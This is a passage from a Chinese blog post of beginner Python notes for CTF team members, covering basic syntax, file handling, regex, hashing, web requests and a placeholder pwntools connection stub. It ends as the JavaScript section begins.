

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="uert">
  <meta name="keywords" content="">
  
    <meta name="description" content="CTF 成员基础语法笔记 目录  Python 基础 JavaScript 基础 PHP 框架 - ThinkPHP   1. Python 基础 目录 1. Python基础  1.1 Python基本语法 1.2 数据类型 1.3 常见操作符 1.4 条件语句 1.5 循环结构 1.6 列表与字典   2. 函数与模块  2.1 函数定义与调用 2.2 模块导入   3. 进阶内容  3.1">
<meta property="og:type" content="article">
<meta property="og:title" content="ctf基础笔记">
<meta property="og:url" content="https://theganlove.github.io/2024/09/05/ctf%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="CTF 成员基础语法笔记 目录  Python 基础 JavaScript 基础 PHP 框架 - ThinkPHP   1. Python 基础 目录 1. Python基础  1.1 Python基本语法 1.2 数据类型 1.3 常见操作符 1.4 条件语句 1.5 循环结构 1.6 列表与字典   2. 函数与模块  2.1 函数定义与调用 2.2 模块导入   3. 进阶内容  3.1">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2024-09-05T13:41:35.000Z">
<meta property="article:modified_time" content="2024-09-06T06:53:59.492Z">
<meta property="article:author" content="uert">
<meta property="article:tag" content="ctfweb">
<meta name="twitter:card" content="summary_large_image">
  
  
  
  <title>ctf基础笔记 - Hexo</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"theganlove.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>主题</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="ctf基础笔记"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-09-05 21:41" pubdate>
          2024年9月5日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          28k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          236 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">ctf基础笔记</h1>
            
            
              <div class="markdown-body">
                
                <p><strong>CTF</strong> <strong>成员基础语法笔记</strong></p>
<p><strong>目录</strong></p>
<ol>
<li><strong>Python</strong> <strong>基础</strong></li>
<li><strong>JavaScript</strong> <strong>基础</strong></li>
<li><strong>PHP</strong> <strong>框架 - ThinkPHP</strong></li>
<li></li>
</ol>
<h1 id="1-Python-基础"><a href="#1-Python-基础" class="headerlink" title="1. Python 基础"></a><strong>1. Python</strong> <strong>基础</strong></h1><hr>
<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><ul>
<li><p><a href="#1-python%E5%9F%BA%E7%A1%80">1. Python基础</a></p>
<ul>
<li><a href="#11-python%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95">1.1 Python基本语法</a></li>
<li><a href="#12-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">1.2 数据类型</a></li>
<li><a href="#13-%E5%B8%B8%E8%A7%81%E6%93%8D%E4%BD%9C%E7%AC%A6">1.3 常见操作符</a></li>
<li><a href="#14-%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5">1.4 条件语句</a></li>
<li><a href="#15-%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84">1.5 循环结构</a></li>
<li><a href="#16-%E5%88%97%E8%A1%A8%E4%B8%8E%E5%AD%97%E5%85%B8">1.6 列表与字典</a></li>
</ul>
</li>
<li><p><a href="#2-%E5%87%BD%E6%95%B0%E4%B8%8E%E6%A8%A1%E5%9D%97">2. 函数与模块</a></p>
<ul>
<li><a href="#21-%E5%87%BD%E6%95%B0%E5%AE%9A%E4%B9%89%E4%B8%8E%E8%B0%83%E7%94%A8">2.1 函数定义与调用</a></li>
<li><a href="#22-%E6%A8%A1%E5%9D%97%E5%AF%BC%E5%85%A5">2.2 模块导入</a></li>
</ul>
</li>
<li><p><a href="#3-%E8%BF%9B%E9%98%B6%E5%86%85%E5%AE%B9">3. 进阶内容</a></p>
<ul>
<li><a href="#31-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99">3.1 文件读写</a></li>
<li><a href="#32-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86">3.2 异常处理</a></li>
<li><a href="#33-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8Fregex">3.3 正则表达式（Regex）</a></li>
<li><a href="#34-%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86">3.4 加密与解密</a></li>
</ul>
</li>
<li><p><a href="#4-%E9%AB%98%E7%BA%A7%E5%86%85%E5%AE%B9">4. 高级内容</a></p>
<ul>
<li><a href="#41-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8E%E5%A4%9A%E8%BF%9B%E7%A8%8B">4.1 多线程与多进程</a></li>
<li><a href="#42-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%88%AC%E8%99%AB">4.2 网络与爬虫</a></li>
<li><a href="#43-%E5%88%A9%E7%94%A8python%E8%BF%9B%E8%A1%8C%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99">4.3 利用Python进行自动化脚本编写</a></li>
</ul>
</li>
<li><p><a href="#5-ctf%E4%B8%AD%E7%9A%84python%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF">5. CTF中的Python应用场景</a></p>
<ul>
<li><a href="#51-exploit%E5%BC%80%E5%8F%91">5.1 Exploit开发</a></li>
<li><a href="#52-%E9%80%86%E5%90%91%E4%B8%8E%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90">5.2 逆向与二进制分析</a></li>
<li><a href="#53-%E5%A4%8D%E6%9D%82%E7%9A%84%E7%AE%97%E6%B3%95%E9%A2%98">5.3 复杂的算法题</a></li>
</ul>
</li>
</ul>
<h4 id="1-1-Python基本语法"><a href="#1-1-Python基本语法" class="headerlink" title="1.1 Python基本语法"></a>1.1 Python基本语法</h4><p><strong>Hello World</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hello, World!&quot;</span>)<br></code></pre></td></tr></table></figure>
<p>这是Python的入门示例，了解Python如何输出信息。</p>
<h4 id="1-2-数据类型"><a href="#1-2-数据类型" class="headerlink" title="1.2 数据类型"></a>1.2 数据类型</h4><p>Python中的基本数据类型包括：</p>
<ul>
<li><strong>整数（int）</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">x = <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure></li>
<li><strong>浮点数（float）</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">y = <span class="hljs-number">3.14</span><br></code></pre></td></tr></table></figure></li>
<li><strong>字符串（str）</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">name = <span class="hljs-string">&quot;Python&quot;</span><br></code></pre></td></tr></table></figure></li>
<li><strong>布尔值（bool）</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">is_true = <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure></li>
</ul>
<h4 id="1-3-常见操作符"><a href="#1-3-常见操作符" class="headerlink" title="1.3 常见操作符"></a>1.3 常见操作符</h4><ul>
<li>算术操作：<code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>//</code>（整除），<code>%</code>（取模）</li>
<li>比较操作：<code>==</code>, <code>!=</code>, <code>&gt;</code>, <code>&lt;</code>, <code>&gt;=</code>, <code>&lt;=</code></li>
<li>逻辑操作：<code>and</code>, <code>or</code>, <code>not</code></li>
</ul>
<h4 id="1-4-条件语句"><a href="#1-4-条件语句" class="headerlink" title="1.4 条件语句"></a>1.4 条件语句</h4><p>CTF中的许多逻辑都依赖于条件判断，了解<code>if-else</code>语句是必要的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">5</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;x 大于 5&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;x 小于或等于 5&quot;</span>)<br></code></pre></td></tr></table></figure>

<h4 id="1-5-循环结构"><a href="#1-5-循环结构" class="headerlink" title="1.5 循环结构"></a>1.5 循环结构</h4><p>Python有两种常用的循环：<code>for</code>循环和<code>while</code>循环。</p>
<p><strong>for 循环</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure>

<p><strong>while 循环</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">x = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> x &lt; <span class="hljs-number">5</span>:<br>    <span class="hljs-built_in">print</span>(x)<br>    x += <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<h4 id="1-6-列表与字典"><a href="#1-6-列表与字典" class="headerlink" title="1.6 列表与字典"></a>1.6 列表与字典</h4><ul>
<li><p><strong>列表（List）</strong>：存储多个元素。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">my_list = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>字典（Dictionary）</strong>：键值对存储结构。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">my_dict = &#123;<span class="hljs-string">&#x27;key1&#x27;</span>: <span class="hljs-string">&#x27;value1&#x27;</span>, <span class="hljs-string">&#x27;key2&#x27;</span>: <span class="hljs-string">&#x27;value2&#x27;</span>&#125;<br></code></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-函数与模块"><a href="#2-函数与模块" class="headerlink" title="2. 函数与模块"></a>2. 函数与模块</h3><h4 id="2-1-函数定义与调用"><a href="#2-1-函数定义与调用" class="headerlink" title="2.1 函数定义与调用"></a>2.1 函数定义与调用</h4><p>函数在CTF中是组织代码、复用功能的重要工具。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Hello, <span class="hljs-subst">&#123;name&#125;</span>!&quot;</span><br><br><span class="hljs-built_in">print</span>(greet(<span class="hljs-string">&quot;CTF 选手&quot;</span>))<br></code></pre></td></tr></table></figure>

<h4 id="2-2-模块导入"><a href="#2-2-模块导入" class="headerlink" title="2.2 模块导入"></a>2.2 模块导入</h4><p>CTF中常用Python标准库和第三方模块进行信息处理。例如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib  <span class="hljs-comment"># 用于哈希函数</span><br><br><span class="hljs-comment"># 生成字符串的MD5值</span><br>hash_object = hashlib.md5(<span class="hljs-string">b&#x27;CTF&#x27;</span>).hexdigest()<br><span class="hljs-built_in">print</span>(hash_object)<br></code></pre></td></tr></table></figure>

<p>CTF常用的模块包括<code>hashlib</code>（处理哈希算法）、<code>requests</code>（网络请求）、<code>re</code>（正则表达式）等。</p>
<h3 id="3-进阶内容"><a href="#3-进阶内容" class="headerlink" title="3. 进阶内容"></a>3. 进阶内容</h3><h4 id="3-1-文件读写"><a href="#3-1-文件读写" class="headerlink" title="3.1 文件读写"></a>3.1 文件读写</h4><p>在CTF比赛中，很多情况下需要对文件进行读写操作，通常用于读取输入数据或写入解题结果。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 读取文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;input.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br><br><span class="hljs-comment"># 写入文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-string">&#x27;这是结果输出&#x27;</span>)<br></code></pre></td></tr></table></figure>

<h4 id="3-2-异常处理"><a href="#3-2-异常处理" class="headerlink" title="3.2 异常处理"></a>3.2 异常处理</h4><p>CTF中的代码有时会出现意外错误，异常处理可以确保程序在错误情况下也能稳定运行。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    result = <span class="hljs-number">10</span> / <span class="hljs-number">0</span><br><span class="hljs-keyword">except</span> ZeroDivisionError:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;不能除以0！&quot;</span>)<br></code></pre></td></tr></table></figure>

<h4 id="3-3-正则表达式（Regex）"><a href="#3-3-正则表达式（Regex）" class="headerlink" title="3.3 正则表达式（Regex）"></a>3.3 正则表达式（Regex）</h4><p>正则表达式常用于CTF中的信息提取，尤其是文本分析和数据过滤。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br>text = <span class="hljs-string">&quot;flag&#123;this_is_a_flag&#125;&quot;</span><br>pattern = <span class="hljs-string">r&#x27;flag&#123;.*&#125;&#x27;</span><br><span class="hljs-keyword">match</span> = re.search(pattern, text)<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;找到了flag:&quot;</span>, <span class="hljs-keyword">match</span>.group())<br></code></pre></td></tr></table></figure>

<h4 id="3-4-加密与解密"><a href="#3-4-加密与解密" class="headerlink" title="3.4 加密与解密"></a>3.4 加密与解密</h4><p>在CTF中，加密与解密任务非常常见。使用Python处理常见的加密&#x2F;解密任务是一项必备技能。</p>
<p><strong>Base64解码</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>encoded = <span class="hljs-string">b&#x27;UHl0aG9u&#x27;</span><br>decoded = base64.b64decode(encoded)<br><span class="hljs-built_in">print</span>(decoded.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure>

<p><strong>哈希计算</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br>data = <span class="hljs-string">b&quot;password123&quot;</span><br>hash_md5 = hashlib.md5(data).hexdigest()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;MD5:&quot;</span>, hash_md5)<br><br>hash_sha256 = hashlib.sha256(data).hexdigest()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;SHA256:&quot;</span>, hash_sha256)<br></code></pre></td></tr></table></figure>

<h3 id="4-高级内容"><a href="#4-高级内容" class="headerlink" title="4. 高级内容"></a>4. 高级内容</h3><h4 id="4-1-多线程与多进程"><a href="#4-1-多线程与多进程" class="headerlink" title="4.1 多线程与多进程"></a>4.1 多线程与多进程</h4><p>当需要处理大量数据或并发任务时，多线程和多进程能显著提高效率。</p>
<p><strong>多线程</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> threading<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">task</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Task <span class="hljs-subst">&#123;name&#125;</span> is running&quot;</span>)<br><br>thread1 = threading.Thread(target=task, args=(<span class="hljs-string">&quot;A&quot;</span>,))<br>thread2 = threading.Thread(target=task, args=(<span class="hljs-string">&quot;B&quot;</span>,))<br>thread1.start()<br>thread2.start()<br>thread1.join()<br>thread2.join()<br></code></pre></td></tr></table></figure>

<h4 id="4-2-网络与爬虫"><a href="#4-2-网络与爬虫" class="headerlink" title="4.2 网络与爬虫"></a>4.2 网络与爬虫</h4><p>CTF中的一些题目涉及网络爬虫，使用Python可以快速获取并分析网页内容。</p>
<p><strong>请求网页</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>response = requests.get(<span class="hljs-string">&#x27;http://example.com&#x27;</span>)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure>

<p><strong>解析HTML</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>soup = BeautifulSoup(response.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br><span class="hljs-built_in">print</span>(soup.title.text)<br></code></pre></td></tr></table></figure>

<h4 id="4-3-利用Python进行自动化脚本编写"><a href="#4-3-利用Python进行自动化脚本编写" class="headerlink" title="4.3 利用Python进行自动化脚本编写"></a>4.3 利用Python进行自动化脚本编写</h4><p>自动化是CTF比赛中的重要技能，Python强大的自动化能力可以帮助快速解决某些复杂题目。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 自动化发送请求</span><br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://example.com/login&quot;</span><br>data = &#123;<span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;ctf&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;12345&#x27;</span>&#125;<br>response = requests.post(url, data=data)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure>

<h3 id="5-CTF中的Python应用场景"><a href="#5-CTF中的Python应用场景" class="headerlink" title="5. CTF中的Python应用场景"></a>5. CTF中的Python应用场景</h3><h4 id="5-1-Exploit开发"><a href="#5-1-Exploit开发" class="headerlink" title="5.1 Exploit开发"></a>5.1 Exploit开发</h4><p>在一些CTF的pwn题目中，选手需要编写Python脚本与远程服务进行交互，以利用漏洞。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 连接到远程服务</span><br>conn = remote(<span class="hljs-string">&#x27;example.com&#x27;</span>, <span class="hljs-number">12345</span>)<br><br><span class="hljs-comment"># 发送数据</span><br>conn.sendline(<span class="hljs-string">b&#x27;payload&#x27;</span>)<br><br><span class="hljs-comment"># 接收响应</span><br>response = conn.recvline()<br><span class="hljs-built_in">print</span>(response)<br></code></pre></td></tr></table></figure>

<h4 id="5-2-逆向与二进制分析"><a href="#5-2-逆向与二进制分析" class="headerlink" title="5.2 逆向与二进制分析"></a>5.2 逆向与二进制分析</h4><p>Python可以通过编写脚本来自动化逆向工程任务，解码加密数据或分析程序的输出。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 对二进制数据进行解码</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;binaryfile&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    binary_data = f.read()<br><br><span class="hljs-comment"># 自定义分析逻辑</span><br>decoded_data = binary_data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;ignore&#x27;</span>)<br><span class="hljs-built_in">print</span>(decoded_data)<br></code></pre></td></tr></table></figure>

<h4 id="5-3-复杂的算法题"><a href="#5-3-复杂的算法题" class="headerlink" title="5.3 复杂的算法题"></a>5.3 复杂的算法题</h4><p>CTF比赛中可能涉及复杂的数学、图论或密码学算法。Python内置了丰富的库来解决这些问题，如<code>sympy</code>用于符号计算、<code>numpy</code>用于矩阵计算等。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sympy<br><br>x = sympy.Symbol(<span class="hljs-string">&#x27;x&#x27;</span>)<br>equation = sympy.Eq(x**<span class="hljs-number">2</span> + <span class="hljs-number">2</span>*x - <span class="hljs-number">8</span>, <span class="hljs-number">0</span>)<br>solution = sympy.solve(equation)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解:&quot;</span>, solution)<br></code></pre></td></tr></table></figure>

<p>！</p>
<h1 id="2-JavaScript-基础"><a href="#2-JavaScript-基础" class="headerlink" title="2. JavaScript 基础"></a><strong>2. JavaScript</strong> <strong>基础</strong></h1><hr>
<h2 id="目录-1"><a href="#目录-1" class="headerlink" title="目录"></a>目录</h2><ul>
<li><p><a href="#1-javascript%E4%B8%AD%E7%9A%84%E5%AF%B9%E8%B1%A1">1. JavaScript中的对象</a></p>
<ul>
<li><a href="#11-%E5%AF%B9%E8%B1%A1%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5">1.1 对象基本概念</a></li>
